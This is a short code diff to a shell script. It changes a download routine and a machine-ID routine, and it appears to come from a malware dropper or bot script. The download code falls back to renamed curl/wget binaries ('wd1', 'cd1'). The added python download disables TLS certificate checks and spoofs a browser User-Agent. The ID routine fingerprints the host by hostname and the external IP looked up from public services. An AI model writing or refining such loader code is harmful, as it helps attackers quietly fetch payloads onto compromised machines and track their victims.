@@ -425,7 +425,20 @@ downloads() {
         elif [ "$cmd" = "wget" ] || [ "$cmd" = "wd1" ]; then
             $cmd --timeout=30 --tries=3 -q -O "$dest" "$target_url"
         elif [ "$cmd" = "python3" ]; then
-            $cmd -c "import urllib.request; open('$dest', 'wb').write(urllib.request.urlopen('$target_url').read())"
+            $cmd -c "
+import urllib.request, ssl
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+req = urllib.request.Request('$target_url', headers={'User-Agent': 'Mozilla/5.0'})
+try:
+    with urllib.request.urlopen(req, context=ctx, timeout=30) as resp, open('$dest', 'wb') as f:
+        f.write(resp.read())
+except Exception as e:
+    import sys
+    print(f'Download failed: {e}', file=sys.stderr)
+    sys.exit(1)
+"
         fi
 
         [ -s "$dest" ]
@@ -454,7 +467,7 @@ generate_machine_id() {
     hostname_short="${hostname_raw%%.*}"
     [ -z "$hostname_short" ] && hostname_short="UNKNOWN"
 
-    providers="ifconfig.me icanhazip.com ipinfo.io/ip"
+    providers="http://ifconfig.me http://icanhazip.com http://ipinfo.io/ip"
 
 
     if [ -x "/usr/bin/curl" ] || [ -x "/usr/bin/cd1" ] || command -v curl >/dev/null 2>&1 || command -v cd1 >/dev/null 2>&1; then
@@ -500,7 +513,7 @@ generate_machine_id() {
                 external_ip=$(python3 -c "
 try:
     import urllib.request
-    url = 'http://$provider'
+    url = '$provider'
     req = urllib.request.urlopen(url, timeout=2)
     print(req.read().decode('utf-8').strip())
 except Exception:
